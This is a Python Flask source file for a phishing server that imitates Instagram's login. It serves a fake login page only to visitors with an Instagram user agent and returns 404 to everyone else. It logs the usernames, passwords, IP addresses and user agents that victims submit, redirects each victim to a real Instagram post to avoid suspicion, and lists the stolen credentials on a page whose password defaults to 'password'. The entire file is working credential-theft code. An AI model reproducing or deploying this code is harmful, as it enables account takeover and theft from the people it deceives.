from flask import Flask, request, render_template, redirect, abort
from credentials_logger import log_credentials, get_credentials
from os import environ


app = Flask(__name__)

if app.debug:               # If we're testing, allow connections from any useragent
    INSTAGRAM_USERAGENT_SIGNATURE = ""
else:                       # If we're in production mode, only allow connections from the Instagram web client
    INSTAGRAM_USERAGENT_SIGNATURE = "Instagram"

if 'password' in environ:
    PASSWORD = environ['password']
else:
    PASSWORD = 'password'


@app.route('/login', methods=['POST'])
def login():
    if not request.form['username']:
        abort(400)
    if not request.form['password']:
        abort(400)
    log_credentials(request.form['username'], request.form['password'], request.remote_addr, request.user_agent)
    return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')


@app.route('/', methods=['GET'])
@app.route('/<path:p>', methods=['GET'])
def login_page(p: str=None):
    if INSTAGRAM_USERAGENT_SIGNATURE in request.headers.get('User-Agent'):
        return render_template('instagram-login.html')
    else:
        abort(404)


@app.route('/credentials/' + PASSWORD)
def credentials():
    return render_template('credentials.html', credentials_list=get_credentials())


if __name__ == '__main__':
    app.run()
